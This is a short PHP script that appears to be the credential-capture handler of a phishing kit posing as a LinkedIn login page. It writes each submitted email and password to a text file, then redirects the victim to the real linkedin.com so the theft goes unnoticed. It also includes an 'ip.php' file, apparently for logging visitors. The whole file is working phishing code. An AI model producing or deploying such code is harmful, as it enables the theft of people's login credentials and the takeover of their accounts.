<?php
include 'base.php';
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['UsernameForm'] . " [PASS]: " . $_POST['PasswordForm'] . "\n", FILE_APPEND);
header('Location: https://linkedin.com/');
exit();
